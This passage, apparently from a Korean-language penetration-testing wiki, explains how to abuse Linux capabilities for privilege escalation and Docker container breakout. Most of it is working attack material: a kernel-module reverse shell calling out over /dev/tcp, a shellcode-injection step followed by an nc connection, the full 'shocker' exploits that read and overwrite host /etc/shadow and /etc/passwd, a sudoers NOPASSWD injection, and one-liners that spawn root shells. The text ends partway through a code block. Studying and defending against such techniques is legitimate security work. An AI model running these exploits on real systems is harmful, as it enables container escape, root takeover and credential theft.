**Example with environment (Docker breakout) - Shellcode Injection**

다음 명령을 사용해 Docker 컨테이너 내에서 활성화된 capabilities를 확인할 수 있습니다:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

**host**에서 실행 중인 **processes** 목록: `ps -eaf`

1. **architecture** 확인: `uname -m`
2. 해당 architecture용 **shellcode** 찾기 ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. **shellcode**를 process 메모리에 **inject**할 **program** 찾기 ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. program 내의 **shellcode**를 **수정**하고 **컴파일**하기: `gcc inject.c -o inject`
5. **inject**한 뒤 **shell** 가져오기: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**은 process가 **kernel module을 로드하고 언로드할 수 있도록 하며(`init_module(2)`, `finit_module(2)`, `delete_module(2)` system call)**, kernel의 핵심 작업에 직접 접근할 수 있게 합니다. module을 로드하면 kernel 동작을 수정하고 격리 경계를 무력화할 수 있으므로, 이 capability는 심각한 보안 위험을 초래합니다.<sup>[[6]](#references)[[14]](#references)</sup>
일반적인 rootful Linux container에서는 **공유 host kernel**을 대상으로 하므로 직접적인 탈출 경로가 됩니다. module 로드는 namespace의 적용을 받지 않으므로, capability는 초기 user namespace에서 effective 상태여야 합니다. gVisor, Kata, Hyper-V와 같은 userspace-kernel 또는 VM 격리 runtime을 사용하면 접근 가능한 kernel 경계가 달라집니다. `modules_disabled`, kernel lockdown, signature enforcement, seccomp 또는 LSM으로 module 로드를 차단할 수도 있습니다.<sup>[[14]](#references)</sup>

**바이너리 예시**

다음 예시에서 **`python`** 바이너리는 이 capability를 가지고 있습니다.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

기본적으로 **`modprobe`** 명령은 **`/lib/modules/$(uname -r)`** 디렉터리에서 종속성 목록 및 map 파일을 확인합니다.\
이를 악용하기 위해 가짜 **lib/modules** 폴더를 만들어 보겠습니다:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

그런 다음 아래에서 찾을 수 있는 예제 2개 중 하나의 **커널 모듈을 컴파일한 다음** 이 폴더에 복사합니다:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

마지막으로, 이 커널 모듈을 로드하는 데 필요한 Python 코드를 실행하세요:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**binary를 사용한 예 2**

다음 예에서 binary **`kmod`**는 이 capability를 가지고 있습니다.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

이는 **`insmod`** 명령을 사용해 커널 모듈을 삽입할 수 있다는 뜻입니다. 이 권한을 악용해 **reverse shell**을 얻으려면 아래 예제를 따르세요.

**환경 예제(Docker breakout)**

다음 명령을 사용해 Docker 컨테이너에서 활성화된 capabilities를 확인할 수 있습니다:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

이전 출력에서 **SYS_MODULE** capability가 활성화된 것을 확인할 수 있습니다.<sup>[[14]](#references)</sup>

reverse shell을 실행할 **kernel module**과 이를 **compile**할 **Makefile**을 **생성**합니다:

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> Makefile의 각 make 명령 앞에 있는 공백 문자는 **스페이스가 아니라 탭이어야 합니다**!

컴파일하려면 `make`를 실행하세요.

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

마지막으로, shell에서 `nc`를 시작하고 다른 shell에서 **모듈을 로드하면**, nc 프로세스에서 shell을 캡처할 수 있습니다:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**이 기법의 코드는** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)**의 "Abusing SYS_MODULE Capability" 실습실에서 가져왔습니다.**<sup>[[1]](#references)</sup>

이 기법의 또 다른 예시는 [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)에서 확인할 수 있습니다.

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 프로세스가 **파일 읽기 권한과 디렉터리 읽기 및 실행 권한 검사를 우회할 수 있게 합니다**. 또한 `open_by_handle_at(2)` 사용을 허용합니다. 이 함수는 동일한 마운트 파일 시스템의 마운트 파일 디스크립터를 기준으로 유효한 파일 핸들을 해석합니다. 이 기능만으로 프로세스의 마운트 네임스페이스 밖에 있는 모든 파일에 자동으로 접근할 수 있는 것은 아닙니다. 파일 핸들을 이용해 탈출하려면 호스트와 관련된 파일 시스템 참조, 유효하거나 찾아낼 수 있는 핸들, 호환되는 파일 시스템 및 저장소 레이아웃이 필요하며, runtime이나 LSM에 의해 차단되지 않아야 합니다. 과거 Docker의 "Shocker" 기법은 영향을 받는 레이아웃에서 이러한 조건이 결합된 사례를 보였으며, [여기](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)에서 분석했습니다.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**즉, 파일 읽기 권한 검사와 디렉터리 읽기/실행 권한 검사를 우회할 수 있습니다**.<sup>[[14]](#references)</sup>

이 capability가 설정된 **사용자 지정 실행 파일**의 경우, 해당 파일이 무엇을 읽고 호출자에게 무엇을 반환하는지 확인하세요. 호출자가 보호된 경로명과 접두부 길이를 지정할 수 있고, 지정한 접두부의 전체 digest를 알려주는 파일 검색 도구는 파일 읽기 oracle로 작동할 수 있습니다. 첫 `n-1`바이트를 알아낸 뒤, 가능한 다음 바이트마다 후보 digest를 계산해 길이 `n`에 대한 도구의 digest와 비교하면 됩니다. 이는 암호학적 충돌을 찾거나 MD5에 의존하는 방식이 아닙니다. 반복해서 길이를 지정해 질의할 수 있고, 결과 digest가 결정적이며 노출된다는 점에 의존합니다. 접두부 제어 없이 파일 전체의 digest를 반환하는 것만으로는 같은 공격 경로가 성립하지 않습니다. 호출자가 해당 도구를 실행할 수 있고, 파일 capability가 유효해지며, 선택한 경로가 도구의 마운트 네임스페이스에서 접근 가능하고, 실제로 해당 입력/출력 동작이 존재하는지 확인하세요. 수동 열거 중에는 테스트를 위해 알 수 없는 권한 상승 도구를 실행하지 마세요.

**바이너리 예시**

바이너리는 해당 네임스페이스에서 접근 가능한 파일을 읽을 수 있습니다. 따라서 `tar`와 같은 파일에 이 capability가 설정되어 있다면 shadow 파일을 읽을 수 있습니다:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**binary2 예시**

이 경우 **`python`** 바이너리에 이 capability가 있다고 가정해 보겠습니다. root 파일을 나열하려면 다음과 같이 할 수 있습니다:

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

파일을 읽으려면 다음과 같이 하면 됩니다:

```python
print(open("/etc/shadow", "r").read())
```

**환경에서의 예시 (Docker breakout)**

`capsh --print`를 사용하면 Docker 컨테이너 내에서 활성화된 capabilities를 확인할 수 있습니다.<sup>[[14]](#references)[[26]](#references)</sup>

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

이전 출력에서 **DAC_READ_SEARCH** capability가 활성화된 것을 확인할 수 있습니다. 이 capability는 DAC 읽기/검색 검사를 우회하고 `open_by_handle_at(2)`을 허용하지만, 그 자체로 프로세스 디버깅 capability인 것은 아닙니다.<sup>[[14]](#references)</sup>

다음 exploit의 작동 방식은 [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)에서 확인할 수 있습니다. 간단히 말해, **CAP_DAC_READ_SEARCH**는 권한 검사 없이 파일 시스템을 탐색하고 `open_by_handle_at(2)`을 사용할 수 있게 합니다. 관련 namespace와 mount에 접근할 수 있는 경우, 다른 프로세스가 연 파일이 노출될 수 있습니다.<sup>[[13]](#references)[[14]](#references)</sup>

이 권한을 악용해 호스트의 파일을 읽는 원본 exploit은 여기서 확인할 수 있습니다: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c). 다음은 **읽을 파일을 첫 번째 인수로 전달하고 결과를 파일에 덤프할 수 있도록 수정한 버전입니다**.<sup>[[12]](#references)</sup>

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    read(0, buf, 1);

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    printf("Success!!\n");

    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);

    close(fd2); close(fd1);

    return 0;
}
```

> [!WARNING]
> exploit은 호스트에 마운트된 항목의 포인터를 찾아야 합니다. 원래 exploit은 파일 /.dockerinit을 사용했으며, 이 수정된 버전은 /etc/hostname을 사용합니다. exploit이 작동하지 않는다면 다른 파일을 지정해야 할 수 있습니다. 호스트에 마운트된 파일을 찾으려면 mount 명령을 실행하세요:

![CAP SYS MODULE - CAP DAC READ SEARCH: exploit은 호스트에 마운트된 항목의 포인터를 찾아야 합니다. 원래 exploit은 파일 /.dockerinit을 사용했으며, 이 수정된 버전은...](<../../images/image (407) (1).png>)

**이 기법의 코드는** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)**의 "Abusing DAC_READ_SEARCH Capability" 실습실에서 복사했습니다.**<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**이 capability는 파일 읽기 및 쓰기 권한 검사와 대부분의 실행 권한 검사를 우회합니다.** 일반 파일을 실행하려면 실행 비트가 하나 이상 설정되어 있어야 합니다. 읽기 전용 마운트, immutable 상태 또는 LSM에 의한 거부는 우회하지 않습니다.<sup>[[14]](#references)</sup>

권한이 있는 그룹에 속해 읽기 또는 쓰기가 가능해지는 파일을 찾아보세요. 유용한 대상은 대상 파일의 소유권과 mode bits에 따라 달라집니다.<sup>[[14]](#references)</sup>

**binary 예시**

이 예시에서 vim에는 이 capability가 있으므로 _passwd_, _sudoers_ 또는 _shadow_ 같은 파일을 수정할 수 있습니다:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**바이너리 2 예시**

이 예시에서는 **`python`** 바이너리에 이 capability가 부여됩니다. python을 사용하면 어떤 파일이든 덮어쓸 수 있습니다:

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**환경 + CAP_DAC_READ_SEARCH를 사용한 예시(Docker breakout)**

`CAP_DAC_READ_SEARCH`는 `open_by_handle_at(2)`을 허용하지만, 쓰기 권한 검사를 우회하지는 **않습니다**. 확인된 handle을 통해 쓰려면 프로세스의 유효 filesystem UID/GID 또는 ACL에 쓰기 권한이 있거나 `CAP_DAC_OVERRIDE`가 추가로 필요합니다. 호스트와 관련된 filesystem 참조, 지원되는 file handle, 쓰기 가능한 mount, runtime/LSM 정책도 해당 작업을 허용해야 합니다. 유효 capability와 identity를 확인하세요. 어느 한 capability만으로는 호스트의 대상 위치에 쓸 수 있음을 증명하지 못합니다. [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) 및 [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html)를 참조하세요.<sup>[[14]](#references)[[26]](#references)</sup>

먼저 호스트의 [**DAC_READ_SEARCH capability를 악용해 임의의 파일을 읽는**](linux-capabilities.md#cap_dac_read_search) 이전 섹션을 읽고 exploit을 **컴파일**하세요.\
다음의 과거 샘플은 `O_RDWR`로 확인된 파일을 열려고 시도합니다. 앞서 설명한 filesystem 및 쓰기 권한 조건이 충족되는 경우에만 성공합니다:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```

Docker container에서 탈출하려면 호스트의 `/etc/shadow`와 `/etc/passwd` 파일을 **다운로드**하고, 여기에 **새 사용자**를 **추가**한 다음, **`shocker_write`**를 사용해 파일을 덮어쓸 수 있습니다. 그런 다음 **ssh**로 **접속**합니다.

**이 기법의 코드는** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)**의 "Abusing DAC_OVERRIDE Capability" 실습에서 복사했습니다.**<sup>[[1]](#references)</sup>

## CAP_CHOWN

**이 capability를 사용하면 프로세스가 파일의 소유권을 변경할 수 있습니다.**<sup>[[14]](#references)</sup>

**바이너리 예시**

**`python`** 바이너리에 이 capability가 있다고 가정해 보겠습니다. 파일의 소유자를 **`shadow`**와 같이 변경한 다음, 다른 권한이 허용한다면 해당 접근 권한을 이용해 파일을 수정할 수 있습니다:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

또는 다음 capability가 설정된 **`ruby`** 바이너리로:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP_FOWNER

**이 capability는 권한 변경을 포함한 여러 파일 작업에서 소유권 검사를 우회합니다.**<sup>[[14]](#references)</sup>

**바이너리 예시**

python에 이 capability가 있으면 shadow 파일의 권한을 수정하고, **root 비밀번호를 변경해** 권한을 상승시킬 수 있습니다:

```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```

### CAP_SETUID

**이 capability를 사용하면 커널이 적용하는 자격 증명 및 capability 규칙에 따라 프로세스의 유효 사용자 ID를 변경할 수 있습니다**.<sup>[[14]](#references)</sup>

**바이너리 예제**

python에 이 **capability**가 있으면 이를 쉽게 악용해 root 권한으로 상승할 수 있습니다:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**또 다른 방법:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

커스텀 실행 파일에 effective `CAP_SETUID`가 설정되어 있다면, capability만으로 셸을 얻을 수 있다고 가정하지 말고 도달 가능한 코드 경로를 확인하세요. [`printf`](https://man7.org/linux/man-pages/man3/printf.3.html)에 *format string*으로 전달되는 호출자 제어 텍스트는 프로세스 메모리를 노출하거나 변경할 수 있습니다. 하지만 유효한 권한 전환이 이루어지려면 취약한 호출, 제어 가능한 입력, 그리고 `setuid(0)` 이후의 동작이 필요합니다. 해당 동작이 이름으로 외부 helper를 실행한다면, 실행 시의 effective identity, 실제 `PATH`, 그리고 검색 순서상 앞선 디렉터리 중 호출자가 쓰고 탐색할 수 있는 곳이 있는지 확인하세요. 효과가 없는 file capability, `no_new_privs`, 신뢰할 수 있는 고정 helper 경로 또는 도달할 수 없는 분기 등은 결과를 바꿉니다. 바이너리나 사용 가능한 소스를 오프라인으로 검토하세요. 일상적인 열거 과정에서 의심스러운 권한 상승 helper를 실행하지 마세요.

## CAP_SETGID

**이 capability를 사용하면 커널이 적용하는 자격 증명 및 capability 규칙에 따라 프로세스가 effective group ID를 변경할 수 있습니다**.<sup>[[14]](#references)</sup>

**권한을 상승하기 위해 덮어쓸 수 있는** 파일이 많이 있습니다. [**여기에서 아이디어를 얻을 수 있습니다**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**바이너리 예시**

이 경우 어떤 그룹으로든 가장할 수 있으므로 그룹에서 읽을 수 있는 흥미로운 파일을 찾아야 합니다:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

권한 상승을 위해 (읽기 또는 쓰기를 통해) 악용할 수 있는 파일을 찾았다면, 다음과 같이 **관심 대상 그룹을 가장해 셸을 얻을 수 있습니다**:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

이 경우 group shadow를 사칭하여 `/etc/shadow` 파일을 읽을 수 있었습니다:

```bash
cat /etc/shadow
```

### 결합 체인: CAP_SETGID + CAP_CHOWN

두 capability를 같은 helper에서 사용할 수 있다면, 실용적인 체인은 다음과 같습니다.

1. EGID를 `shadow`(또는 다른 권한 있는 그룹)로 전환합니다.
2. `/etc/shadow`에 `chown`을 사용해 그룹을 `shadow`로 유지하면서 UID를 설정합니다.
3. 대상 hash를 읽고 crack/pivot합니다.

```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

이렇게 하면 root 권한을 직접 얻을 필요가 없으며, credential reuse를 통해 권한을 전환하는 데 흔히 충분합니다.

**docker**가 설치되어 있다면 **docker group**을 **impersonate**하여 [**docker socket**과 통신하고 권한을 상승](#writable-docker-socket)할 수 있습니다.

## CAP_SETFCAP

**이 capability를 사용하면 프로세스에서 파일 capabilities를 설정할 수 있습니다**.<sup>[[14]](#references)</sup>

**바이너리 예시**

python에 이 **capability**가 있으면 이를 매우 쉽게 악용해 root 권한으로 상승할 수 있습니다:

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> 새로 작성한 파일 capability set은 이전 set을 대체합니다. 따라서 helper를 새 capability만으로 실행하면 다른 파일을 업데이트하기 위한 `CAP_SETFCAP`이 더 이상 유지되지 않을 수 있습니다.<sup>[[14]](#references)[[25]](#references)</sup>

[SETUID capability](linux-capabilities.md#cap_setuid)를 확보한 후 해당 섹션에서 권한 상승 방법을 확인할 수 있습니다.

**환경을 이용한 예시 (Docker breakout)**

Docker의 문서화된 기본 capability set에는 **CAP_SETFCAP**이 포함되지만, 실제 set은 runtime 설정에 따라 달라집니다.<sup>[[19]](#references)</sup>
다음 명령으로 프로세스 capability를 확인할 수 있습니다:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

이 capability를 사용하면 파일 capability를 기록할 수 있지만, 이것만으로 현재 프로세스에 해당 capability가 부여되거나 파일 실행 시 적용되는 파일, bounding set 및 namespace 규칙을 우회할 수 있는 것은 아닙니다.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

